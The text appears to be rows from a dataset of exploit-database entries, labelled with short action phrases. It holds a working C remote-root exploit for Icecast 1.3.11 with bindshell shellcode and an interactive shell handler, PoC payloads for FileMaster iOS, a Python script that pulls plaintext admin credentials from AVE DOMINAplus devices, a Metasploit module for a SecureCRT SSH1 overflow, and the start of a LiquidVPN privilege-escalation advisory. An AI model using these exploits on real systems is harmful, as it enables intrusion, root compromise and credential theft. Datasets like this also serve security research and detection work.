bothered to check all entry points.   *  * This is why:  *  * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep strcpy all.c | wc -w  *    284  * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep sprintf all.c | wc -w  *    568  * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep strcat all.c | wc -w  *     68  * root@blackout:/home/diz/audits/icecast-1.3.11/src >                      *  *  * A quick and dirty patch is to check and make sure the length of expr does not  * surpass 8000 bytes ala in client_login() in /src/client.c and recompile:  *   * // dirty fix  * if(strlen(expr) > 8000)   *	return;  * // end of dirty fix  *  * What can we do:  *  * We can either overwrite a framepointer and make the process pop an   * instruction pointer out of memory we control. Or overflow eip directly.   *   * We go for the direct eip hump(tm)  *  * For framepointer humpage:  *  * Finding the address to overflow ebp with to make esp  * point into the start of our buffer is easy..just gdb the  * target platform icecast binary and set a breakpoint in  * the client_login() function..output will be like this  *  * ...  *  Breakpoint 1, 0x804af49 in client_login (con=0x808d0f0, expr=0xbf3fdaf4  *  ""GET "", 'x' <repeats 196 times>...) at client.c:97  *  97      void client_login(connection_t *con, char *expr)  * ...  *  * expr is a pointer to our original string..so we know that  * is the start of our string in memory. Luck would have it we can just   * use that exact address and with pop incrementing it works out  * to be correct and point to the start of our eip bytes :)  * or into nops on a normal overflow. (which we will be doing)  *  * !!! Attention:  *  * When we just go for eip in one go we also need this address because  * icecast will only give us one go :( so we can't offset and brute it  * allthough we CAN pad with 7000+ nops..so finding a decent one go  * compromise shouldnt be that much of a problem :)  *  * 			diz - #temp  *  * special word to pip and blink for helping me gather expr addresses  *   * word to: eric, n0b0dy, muska, alcapone, sj, primalux, vonguard  * 		khromy, jesse666 and r0ss  *   * !!! A big ""we hope leprosy strikes thee down!"" to 2600.net !!!  *  * to compile standard overflow sploit: gcc icx.c -o icx   * to compile framepointer overflow sploit: gcc icx.c -o icx -DFPO  *  * note: for practical exploit usage just use standard mode  * framepointer bits are left in cuz Im toying with them  *  * 	this version is meant for linux x86 targets   *  *     PATCHES!?!?! WE DON'T NEED NO STINKIN PATCHES!!!  */  /*  root@blackout:/usr/local/icecast/bin > ./icecast Icecast Version 1.3.11 Initializing... Icecast comes with NO WARRANTY, to the extent permitted by law. You may redistribute copies of Icecast under the terms of the GNU General Public License. For more information about these matters, see the file named COPYING. Starting thread engine... [16/Feb/2002:15:39:33] Icecast Version 1.3.11 Starting.. [16/Feb/2002:15:39:33] Starting Admin Console Thread... -> [16/Feb/2002:15:39:33] Starting main connection handler... -> [16/Feb/2002:15:39:33] Listening on port 8000... -> [16/Feb/2002:15:39:33] Listening on port 8001... -> [16/Feb/2002:15:39:33] Using 'blackout' as servername... -> [16/Feb/2002:15:39:33] Server limits: 900 clients, 900 clients per  source, 10 sources, 5 admins -> [16/Feb/2002:15:39:33] WWW Admin interface accessible at  http://blackout:8000/admin -> [16/Feb/2002:15:39:33] Starting Calender Thread... -> [16/Feb/2002:15:39:33] Starting UDP handler thread... -> [16/Feb/2002:15:39:33] Starting relay connector thread... -> -> [16/Feb/2002:15:39:33] [Bandwidth: 0.000000MB/s] [Sources: 0]  [Clients: 0] [Admins: 1] [Uptime: 0 seconds] ->   // this was a target compiled from source on my machine  diz@blackout:~/code/dizcode > ./icx -h blackout -p 8000 -b 0xbf3fdaf4 -a 1  [ icx -- icecast humpage -- diz (#temp) ] ! resolving server: blackout ! compiled as standard overflow version ! using 0xbf3fdb58 as eip address ! sending string ! giving remote time to setup shop...zzz ! attempting to connect to bindshell ! connected to remote shell :) $ id uid=0(root) gid=0(root) groups=0(root),1(bin),14(uucp),15(shadow),16(dialout),17(audio),33(video),65534(nogroup) $ exit ! done diz@blackout:~/code/dizcode >   */  #include <stdio.h> #include <string.h> #include <unistd.h> #include <stdlib.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <netdb.h> #include <errno.h>  #define ALLIGN	0 #define NOP	0x90  #define STRING 	""GET %s%s HTTP/1.0\n\n""   char allignbuf[4];  char outbuf[8206];  char nopbuf[512];   #ifdef FPO char humpbuf[8182]; // 8181 bytes to hit ebp #else char humpbuf[8186]; // 8185 bytes to overwrite ebp and eip ( minus 4 for BSD hosts) #endif  char code[] =  	// taeho oh bindshell code -- binds to port 30464 	""\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0""   	""\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06""   	""\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89""   	""\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31""   	""\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80""   	""\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04""   	""\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd""   	""\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80""   	""\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f""   	""\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89""   	""\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31""   	""\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff"";   struct info { 	char *host; 	char *ip; 	int port; 	int allign; 	u_long address; } icx;  void type(int type); void handleshell(int sock);  int main(int argc, char **argv) { 	struct sockaddr_in slut; 	struct hostent *ip; 	int s, b, len = 0, i; 	u_int w[4], eip[4]; 	char *temp, c;	 	 	if(argc == 1) { 		fprintf(stderr, ""Usage: %s -h <host> -p <icecast port> [ -t <type> ] OR [ -a <allign>  -b <address of *expr> ]\n"", argv[0]); 		fprintf(stderr, ""\nTypes are (linux version):\n\n""); 		fprintf(stderr, ""------------------------------------------------\n""); 		fprintf(stderr, ""(1) SuSE 7.2 icecast 1.3.10 (rpm)\n""); 		fprintf(stderr, ""(2) debian 2.2.r2 sid icecast 1.3.11 (deb)\n""); 		fprintf(stderr, ""(3) slackware 8.0.0 (�tta) icecast 1.3.11 (tgz)\n""); 		fprintf(stderr, ""------------------------------------------------\n\n""); 		fprintf(stderr, ""[  read comments on how to aquire new targets  ]\n\n""); 		exit(1); 	} 	 	fprintf(stderr, ""[ icx -- icecast humpage -- diz (#temp) ]\n"");  	// default allign 	icx.allign = ALLIGN; 	 	 	while((c = getopt(argc, argv, ""h:p:a:b:t:"")) != EOF) { 		switch(c) { 			case 'h': 				icx.host = optarg; 				break; 			case 'p': 				icx.port = atoi(optarg); 				break; 			case 'b': 				sscanf(optarg, ""%p"", &temp); 				icx.address = (long)temp; 				break; 			case 'a': 				icx.allign = atoi(optarg); 				break; 			case 't': 				type(atoi(optarg)); 				break; 			default: 				fprintf(stderr, ""! huh ?\n""); 				exit(1); 		} 	} 	 	fprintf(stderr, ""! resolving server: %s\n"", icx.host);          if((ip = gethostbyname(icx.host)) == NULL) {                 perror(""! gethostbyname"");                 exit(1);         } 	 	icx.ip = (char *)inet_ntoa(*((struct in_addr *)ip->h_addr));	          s = socket(AF_INET, SOCK_STREAM, 0);         slut.sin_family = AF_INET;         slut.sin_port = htons(icx.port);         slut.sin_addr.s_addr = inet_addr(icx.ip);         memset(&(slut.sin_zero), '\0', 8);   	// setting overflow address  	#ifdef FPO  	icx.address += icx.allign;	 	 	#else 	 	icx.address += 100; // pointing into nops in *expr 	 	#endif   	#ifdef FPO 	 	fprintf(stderr, ""! compiled as frame pointer overflow version\n""); 	fprintf(stderr, ""! using 0x%lx as ebp address\n"", icx.address);  	#else 	 	fprintf(stderr, ""! compiled as standard overflow version\n"");	 	fprintf(stderr, ""! using 0x%lx as eip address\n"", icx.address); 	 	#endif  	 	// sort out overflow bytes 	w[0] = (icx.address & 0x000000ff);         w[1] = (icx.address & 0x0000ff00) >> 8;         w[2] = (icx.address & 0x00ff0000) >> 16;         w[3] = (icx.address & 0xff000000) >> 24; 	 	 	// setting the eip address make sure it points into nops 	// allthough there are no nops to point into yet..behe 	 	#ifdef FPO 	 	icx.address += (16 + icx.allign + 100); 	 	fprintf(stderr, ""! using 0x%lx as eip address\n"", icx.address); 	 	// sort out eip pop bytes 	eip[0] = (icx.address & 0x000000ff);         eip[1] = (icx.address & 0x0000ff00) >> 8;         eip[2] = (icx.address & 0x00ff0000) >> 16;         eip[3] = (icx.address & 0xff000000) >> 24; 	 	#endif  	// fill nop buffer         memset(&nopbuf, '\0', sizeof(nopbuf));         for(i = 0; i < sizeof(nopbuf); i++)                 nopbuf[i] = NOP;  	// allign 	memset(&allignbuf, '\0', sizeof(allignbuf)); 	for(i = 0; i < icx.allign && i < sizeof(allignbuf); i++)  		allignbuf[i] = 'x'; 	 	memset(&humpbuf, '\0', sizeof(humpbuf));	  	#ifdef FPO 	 	// place eip read bytes 4 times 	for(i = 0, b = 0; i < 16; i++, b++) { 		if(b == 4) b = 0; 		humpbuf[i] = (char)eip[b]; 	} 	 	// sprintf(&humpbuf[16], ""%s%s"", nopbuf, code); 	 	#else 	 	sprintf(&humpbuf[0], ""%s%s"", nopbuf, code); 	 	#endif 	 	// filling rest of string with garbage bytes 	// be sure to take the length of nops + shellcode 	// into account when the string contains them 	 	#ifdef FPO 	 	//! fp poop 	for(i = 16; i < (sizeof(humpbuf) - 1); i++) 		humpbuf[i] = 'x'; 	 	#else 	 	// take length off shellcode and nops into account when we have some 	for(i = (strlen(nopbuf) + strlen(code)); i < (sizeof(humpbuf) - 1); i++)                 humpbuf[i] = 'x'; 	 	#endif  	 	// making last 8 bytes overflow bytes (be it ebp..be it eip) 	humpbuf[sizeof(humpbuf) - 9] = (char)w[0];         humpbuf[sizeof(humpbuf) - 8] = (char)w[1];         humpbuf[sizeof(humpbuf) - 7] = (char)w[2];         humpbuf[sizeof(humpbuf) - 6] = (char)w[3];  	humpbuf[sizeof(humpbuf) - 5] = (char)w[0]; 	humpbuf[sizeof(humpbuf) - 4] = (char)w[1]; 	humpbuf[sizeof(humpbuf) - 3] = (char)w[2];	 	humpbuf[sizeof(humpbuf) - 2] = (char)w[3]; 	 	 	// connecting and going for the hump 	if(connect(s, (struct sockaddr *)&slut, sizeof(struct sockaddr)) == -1) { 		perror(""! connect""); 		exit(1); 	} 	else { 		memset(&outbuf, '\0', sizeof(outbuf));	 		snprintf(outbuf, sizeof(outbuf), STRING, allignbuf, humpbuf); 		 		#ifdef DEBUG 		for(i = 0; i < sizeof(outbuf); i++)  			fprintf(stderr, ""! byte %d [ 0x%x ]\n"", i, outbuf[i]); 		#endif 		 		do { 			fprintf(stderr, ""! sending string\n""); 			len += send(s, outbuf, strlen(outbuf), 0); 		} 		while(len < strlen(outbuf)); 		 		close(s); 	 		fprintf(stderr, ""! giving remote time to setup shop...zzz\n""); 		sleep(5);	 	 		fprintf(stderr, ""! attempting to connect to bindshell\n""); 		s = socket(AF_INET, SOCK_STREAM, 0); 		slut.sin_port = htons(30464); 		if(connect(s, (struct sockaddr *)&slut, sizeof(struct sockaddr)) == -1) {                 	perror(""! connect""); 			fprintf(stderr, ""! check 30464 with nc in case target was slow\n"");                 	exit(1); 		} 		else { 			fprintf(stderr, ""! connected to remote shell :)\n""); 			handleshell(s); 		}         } 		 	fprintf(stderr, ""! done\n""); 	exit(0); } 	 void type(int type) { 	// suse 7.2 1.3.10 (rpm) 	if(type == 1) { 		icx.address = 0xbf3fdaf4; 		icx.allign = 0; 		return; 	} 	 	// debian 2.2.r2 sid 1.3.11 (deb) 	if(type == 2) { 		icx.address = 0xbeffdaf4; 		icx.allign = 0; 		return; 	} 	 	// slackware 8.0.0 (�tta) 1.3.11 (tgz) 	if(type == 3) { 		icx.address = 0xbeffdaf4;                 icx.allign = 0;                 return; 	}  	fprintf(stderr, ""! type not found..exiting\n""); 	exit(1); }  		 void handleshell(int sock) {  	char inbuf[4096], outbuf[1024];  	fd_set fdset;  	fprintf(stderr, ""$ "");       	while(1) {         	 		FD_ZERO(&fdset);         	FD_SET(fileno(stdin), &fdset);         	FD_SET(sock, &fdset);  		select(sock + 1, &fdset, NULL, NULL, NULL);  		if(FD_ISSET(fileno(stdin), &fdset)) { 			memset(outbuf, '\0', sizeof(outbuf)); 			fgets(outbuf, sizeof(outbuf), stdin); 			if(strstr(outbuf, ""exit"") != NULL) { 				close(sock); 				return; 			} 			if(write(sock, outbuf, strlen(outbuf)) < 0) { 				fprintf(stderr, ""! write error\n""); 				return; 			} 		}  		if(FD_ISSET(sock, &fdset)) { 			memset(inbuf, '\0', sizeof(inbuf)); 			if(read(sock, inbuf, sizeof(inbuf)) < 0) { 				fprintf(stderr, ""! read error\n""); 				return; 			} 			fputs(inbuf, stderr); 			fprintf(stderr, ""$ ""); 		} 	} }",send an arbitrarily long string of data to the server,1
30375,"FileMaster SY-IT 3.1 iOS - Multiple Web Vulnerabilities Document Title: =============== FileMaster SY-IT v3.1 iOS - Multiple Web Vulnerabilities   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1170   Release Date: ============= 2013-12-16   Vulnerability Laboratory ID (VL-ID): ==================================== 1170   Common Vulnerability Scoring System: ==================================== 8.2   Product & Service Introduction: =============================== FileMaster is a file manager, downloader, document viewer, video/audio player, text editor, wifi drive, and more  for iPhone, iPad & iPod Touch. Transfer files from your computer, carry them around with you, and share them with  your friends. Using FileMaster is easy. Just long-press on a file or folder icon to display a popup menu.   Simply tap your selection and you’re ready to go. You can tap on the screen to copy, paste, create folders and so on. There’s no need to worry about the security of FileMaster, either. Your files can be accessed remotely with a password  or locally with a master passcode. No one but you will see what’s in your FileMaster. With FileMaster, you can easily  share files with your friends (peer-to-peep only) using Bluetooth.  (Copy of the Homepage: https://itunes.apple.com/en/app/filemaster-file-manager-downloader/id582219355 )   Abstract Advisory Information: ============================== The Vulnerability Laboratory Research Team discovered multiple vulnerabilities in the Shenzhen Youmi IT Co. Ltd - FileMaster v3.1 iOS mobile web-application.   Vulnerability Disclosure Timeline: ================================== 2013-12-16:    Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Shenzhen Youmi Information Technology Co. Ltd Product: FileMaster - File Manager & Downloader (Mobile Application) 3.1   Exploitation Technique: ======================= Remote   Severity Level: =============== High   Technical Details & Description: ================================ 1.2 A local file/path include web vulnerability has been discovered in the Shenzhen Youmi IT Co. Ltd FileMaster v3.1 mobile web-application for apple iOS. The local file include web vulnerability allows remote attackers to unauthorized include local file requests or system specific path commands to  compromise the web-application or device.  The remote file include web vulnerability is located in the vulnerable `filename` value of the `start upload` module (web interface). Remote attackers  can manipulate the POST method request of  `filename` value in the `start upload` module to compromise the mobile application. The attack vector is  persistent and the request method is POST. The local file/path include execute occcurs in the main `file dir index` list.   A secound possibility to execute the payload by usage of the compress function. After the payload with a non executable has been injected the  attacker can use the compress function to generate a .zip package. The generated zip executes the payload in the filename itself and affects  the main index listing too. The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability  scoring system) count of 8.1(+)|(-)8.2.  Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account with password.  Successful exploitation of the local web vulnerability results in application or connected device component compromise by unauthorized local  file include web attacks.  Request Method(s): 				[+] [POST]  Vulnerable Module(s): 				[+] Start Upload  Vulnerable Parameter(s): 				[+] filename  Affected Module(s): 				[+] Index File Dir List (http://localhost:8000)    1.2 A local file/path include web vulnerability has been discovered in the Shenzhen Youmi IT Co. Ltd FileMaster v3.1 mobile web-application for apple iOS. The local file include web vulnerability allows remote attackers to unauthorized include local file requests or system specific path commands to  compromise the web-application or device.  The remote file include web vulnerability is located in the vulnerable `folder/path` value of the `Create Folder` module  (web interface). Remote attackers can inject own local file requests or system specific path commands as `folder name`. The request method is POST and the  attack vector is persistent. The local file/path include execute occcurs in the main `file dir index` list. The security risk of the local  file include web vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 8.0(+)|(-)8.1.  Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account with password.  Successful exploitation of the local web vulnerability results in application or device compromise by unauthorized local file include attacks.  Request Method(s): 				[+] [POST]  Vulnerable Module(s): 				[+] Create Folder  Vulnerable Parameter(s): 				[+] folder to path  Affected Module(s): 				[+] Index Folder Dir List (http://localhost:8000)    1.3 (1.1) An arbitrary file upload web vulnerability has been discovered in the Shenzhen Youmi IT Co. Ltd FileMaster v3.1 mobile web-application for apple iOS. The arbitrary file upload issue allows remote attackers to upload files with multiple extensions to bypass the web-server filter or system validation.  The vulnerability is located in the `start upload` module. Remote attackers are able to upload a php or js web-shells by a rename of the original file  with multiple extensions to bypass the file restriction or upload filter mechanism. The attacker uploads for example a web-shell with the following  name and extension `image.jpg.gif.js.php.jpg`. After the upload the attacker needs to open the file in the web application. He deletes the .jpg & . gif  file extension and can access the application with elevated access rights. The security risk of the arbitrary file upload web vulnerability is estimated  as high with a cvss (common vulnerability scoring system) count of 7.0(+)|(-)7.1.  Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privileged web-application user account with password. Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of for example web-shells.   Request Method(s): 				[+] [POST]  Vulnerable Module(s): 				[+] Start Upload  Vulnerable Parameter(s): 				[+] filename (multiple extensions)  Affected Module(s): 				[+] Index File Dir List (http://localhost:8000)   Proof of Concept (PoC): ======================= 1.1 The first file include web vulnerability can be exploited by remote attackers without privileged web-application user account and user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below.  Manual reproduce of the vulnerability ...  1. Install and start the app (iphone or ipad) 2. Start your web browser and open the following local standard web-server url ( http://localhost:8000 ) 3. Start to tamper your web session in the browser and click the `Start Upload` button 4. Choose a file and manipulate the filename value by exchange with your own payload (local file request) 5. After the request has been stored in the app you only refresh the index listing 6. Now, the first local file request execute occurs in the index listing Note: Now, we let the system generate a compressed file with the same payload to execute the malicious request as filename value 6. Open the item listing and click in the file option menu the file `compress` (Packen) button 7. The local file include executes in the upload path of the file 8. Successful reproduce of the vulnerability!   PoC:  filename (compress)  <div align=""left""> <input name=""selfiles"" value=""[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!]""""  src=""FileMaster-filename_files/a_002.txt""  onclick=""clickfile(this);"" type=""checkbox"">   <a href=""http://localhost:8000/%3E%22%3C[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!].zip""  target=""_blank""><img src=""FileMaster-filename_files/zip.png""  class=""imgbt""> >""<[LOCAL FILE INCLUDE VULNERABILITY VIA FILENAME VALUE!].zip""></div></th> <td><div    1.2 The second file include web vulnerability can be exploited by remote attackers without privileged web-application user account  and user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below.  Manual reproduce of the vulnerability ...  1. Install and start the app (iphone or ipad) 2. Start your web browser and open the following local standard web-server url ( http://localhost:8000 ) 3. Click the `Create Folder` or `Edit Folder` button 4. Inject your payload to the name value input field 5. The payload execute occurs in the main file dir index or sub category list 6. Successful reproduce of the vulnerability!  PoC: Folder/Path name (index)  <div align=""left""> <input name=""selfiles"" value="">"" <iframe=""LOCAL FILE INCLUDE VULNERABILITY VIA PATH VALUE!]""  onclick=""clickfile(this);"" type=""checkbox"">  <a href=""http://192.168.2.106:8000/%3E%22%3CLOCAL FILE INCLUDE VULNERABILITY VIA PATH VALUE!]:/""> <img src=""LOCAL FILE INCLUDE VULNERABILITY VIA PATH VALUE!]/directory.png""  class=""imgbt""> >""<iframe src=""LOCAL FILE INCLUDE VULNERABILITY VIA PATH VALUE!]/x.txt""></div></th> <td><div align=""right"">2013-12-14 23:33</div></td> <td><div    Solution - Fix & Patch: ======================= 1.1 The first file include web vulnerability can be fixed by a secure encode and parse of the vulnerable filename value and selfiles input field. Restrict and encode the file names in the POST method request of the start upload function to prevent file include attacks.  1.2 The second file include vulnerability can be patched by a secure parse and encode of the path and folder names. Restrict and parse the vulnerable create and edit functions but also the broken index output name validation.   Security Risk: ============== 1.1 The security risk of the local file include web vulnerability in the filename value is estimated as high(+).  1.2 The security risk of the local file include web vulnerability in the folder/path name value is estimated as high.  1.3 the arbitrary file upload and restricted file upload bypass vulnerability is estimated as high(-).   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       - admin@evolution-sec.com Section:    www.vulnerability-lab.com/dev 	- forum.vulnerability-db.com 		       - magazine.vulnerability-db.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.  				Copyright © 2013 | Vulnerability Laboratory [Evolution Security]    --  VULNERABILITY LABORATORY RESEARCH TEAM DOMAIN: www.vulnerability-lab.com CONTACT: research@vulnerability-lab.com",manipulate the POST method request of `filename` value in the `start upload` module,1
47819,"AVE DOMINAplus 1.10.x - Credential Disclosure # Exploit: AVE DOMINAplus 1.10.x - Credential Disclosure # Date: 2019-12-30 # Author: LiquidWorm # Vendor: AVE S.p.A. # Product web page: https://www.ave.it | https://www.domoticaplus.it # Affected version: Web Server Code 53AB-WBS - 1.10.62 # Advisory ID: ZSL-2019-5550 # Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5550.php  #!/usr/bin/env python # # # AVE DOMINAplus <=1.10.x Credentials Disclosure Exploit # # # Vendor: AVE S.p.A. # Product web page: https://www.ave.it | https://www.domoticaplus.it # Affected version: Web Server Code 53AB-WBS - 1.10.62 #                   Touch Screen Code TS01 - 1.0.65 #                   Touch Screen Code TS03x-V | TS04X-V - 1.10.45a #                   Touch Screen Code TS05 - 1.10.36 #                   Models: 53AB-WBS #                           TS01 #                           TS03V #                           TS04X-V #                           TS05N-V #                   App version: 1.10.77 #                   App version: 1.10.65 #                   App version: 1.10.64 #                   App version: 1.10.62 #                   App version: 1.10.60 #                   App version: 1.10.52 #                   App version: 1.10.52A #                   App version: 1.10.49 #                   App version: 1.10.46 #                   App version: 1.10.45 #                   App version: 1.10.44 #                   App version: 1.10.35 #                   App version: 1.10.25 #                   App version: 1.10.22 #                   App version: 1.10.11 #                   App version: 1.8.4 #                   App version: TS1-1.0.65 #                   App version: TS1-1.0.62 #                   App version: TS1-1.0.44 #                   App version: TS1-1.0.10 #                   App version: TS1-1.0.9 # # Summary: DOMINAplus - Sistema Domotica Avanzato. Advanced Home Automation System. # Designed to revolutionize your concept of living. DOMINA plus is the AVE home # automation proposal that makes houses safer, more welcoming and optimized. In # fact, our home automation system introduces cutting-edge technologies, designed # to improve people's lifestyle. DOMINA plus increases comfort, the level of safety # and security and offers advanced supervision tools in order to learn how to evaluate # and reduce consumption through various solutions dedicated to energy saving. # # Desc: The application suffers from clear-text credentials disclosure vulnerability # that allows an unauthenticated attacker to issue a request to an unprotected directory # that hosts an XML file '/xml/authClients.xml' and obtain administrative login information # that allows for a successful authentication bypass attack. # # Default credentials: admin:password # Configuration and camera credentials disclosure: /xml/tsconf.xml # # ================================================== # root@kali:~/domina# ./poc.py http://192.168.1.10 # # Ze microfilm: # ------------- # Username: arnoldcontrol # Password: P1sD0nt5pYMe # ================================================== # # Tested on: GNU/Linux 4.1.19-armv7-x7 #            GNU/Linux 3.8.13-bone50/bone71.1/bone86 #            Apache/2.4.7 (Ubuntu) #            Apache/2.2.22 (Debian) #            PHP/5.5.9-1ubuntu4.23 #            PHP/5.4.41-0+deb7u1 #            PHP/5.4.36-0+deb7u3 # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic #                             @zeroscience # # # Advisory ID: ZSL-2019-5550 # Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5550.php # # # 06.10.2019 #  import sys,re import xml.etree.ElementTree as XML  from urllib2 import Request,urlopen  if (len(sys.argv) <= 1):     print '[*] Usage: poc.py http://ip:port'     exit(0)  host = sys.argv[1] headers = {'Accept': 'application/xml'} request = Request(host+'/xml/authClients.xml', headers=headers) print '\nZe microfilm:' print '-------------' xml = urlopen(request).read() tree = XML.fromstring(xml)  for user in tree.findall('customer'):     print 'Username: ',user.get('plantCode')  for pwd in tree.iter('password'):     print 'Password: '+pwd.text+'\n'",issue a request,1
16460,"SecureCRT 4.0 Beta 2 SSH1 - Remote Buffer Overflow (Metasploit) ## # $Id: securecrt_ssh1.rb 9179 2010-04-30 08:40:19Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::TcpServer  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'SecureCRT <= 4.0 Beta 2 SSH1 Buffer Overflow', 			'Description'    => %q{ 					This module exploits a buffer overflow in SecureCRT <= 4.0 				Beta 2. By sending a vulnerable client an overly long 				SSH1 protocol identifier string, it is possible to execute 				arbitrary code.  				This module has only been tested on SecureCRT 3.4.4. 			}, 			'Author'         => 'MC', 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9179 $', 			'References'     => 				[ 					[ 'CVE', '2002-1059' ], 					[ 'OSVDB', '4991' ], 					[ 'BID', '5287' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'    => 400, 					'BadChars' => ""\x00"", 					'MaxNops'  => 0, 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'SecureCRT.exe (3.4.4)', { 'Ret' => 0x0041b3e0 } ], 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Jul 23 2002', 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptPort.new('SRVPORT', [ true, ""The SSH daemon port to listen on"", 22 ]) 			], self.class) 	end  	def on_client_connect(client) 		return if ((p = regenerate_payload(client)) == nil)  		buffer =  ""SSH-1.1-OpenSSH_3.6.1p2\r\n"" + rand_text_english(243) 		buffer << [target.ret].pack('V') + make_nops(20) + payload.encoded  		print_status(""Sending #{buffer.length} bytes to #{client.getpeername}:#{client.peerport}..."")  		client.put(buffer) 		handler  		service.close_client(client) 	end  end",sending a vulnerable client an overly long SSH1 protocol identifier string,1
45782,"LiquidVPN 1.36 / 1.37 - Privilege Escalation /* ======================================================================= Title: Multiple Privilege Escalation Vulnerabilities Product: LiquidVPN for MacOS Vulnerable versions: 1.37, 1.36 and earlier CVE ID(s): CVE-2018-18856, CVE-2018-18857, CVE-2018-18858, CVE-2018-18859 Impact: Critical Homepage: https://www.liquidvpn.com Identified: 2018-09-29 By: Bernd Leitner (bernd.leitner [at] gmail dot com) =======================================================================  Vendor description: ------------------- ""LiquidVPN creates a secure encrypted link between your device and the Internet. When you connect to the Internet from your home, mobile device, office or a WiFi hotspot with encryption your traffic can’t be monitored by 3rd parties like your ISP. Without encryption, your ISP can store information about the websites you use and sell that data to anyone willing to pay for it. Some ISPs even inject advertisements into web pages to further profit off of the Internet service you pay for.""  Source: https://www.liquidvpn.com   Business recommendation: ------------------------ By exploiting the vulnerabilities documented in this advisory, an attacker can fully compromise a MacOS system with an installation of the LiquidVPN client.  Users are urged to uninstall the application until the vendor ships a new version of the LiquidVPN client.   Vulnerability overview/description: ----------------------------------- LiquidVPN installs the helper tool ""com.smr.liquidvpn.OVPNHelper"" for performing privileged (root) actions. In order to allow other LiquidVPN components to send messages to the helper tool, it implements an XPC service. Static code analysis showed, that the XPC service does not filter incoming messages. This means, regular users (local attackers) can craft arbitrary XPC messages and send them to the service. This leads to the following issues:   1) ""anycmd"" Privilege Escalation (reserved CVE-2018-18857)  After receiving a message, the service checks for the existence of the ""anycmd"" parameter:  ============================================================================================ ... __text:00000001000012E8                 lea     rsi, aAnycmd    ; ""anycmd"" __text:00000001000012EF                 mov     rdi, r14        ; char * __text:00000001000012F2                 call    _strcmp __text:00000001000012F7                 test    eax, eax __text:00000001000012F9                 jnz     loc_1000016C2 __text:00000001000012FF                 mov     [rbp+var_10A38], r15 __text:0000000100001306                 lea     rsi, aCommandLine ; ""command_line"" __text:000000010000130D                 mov     rdi, rbx ... __text:0000000100001336                 lea     rsi, aR         ; ""r"" __text:000000010000133D                 mov     rdi, r14        ; char * __text:0000000100001340                 call    _popen ... ============================================================================================  If ""anycmd"" is found, the ""command_line"" parameter is extracted from the message and directly passed on to a 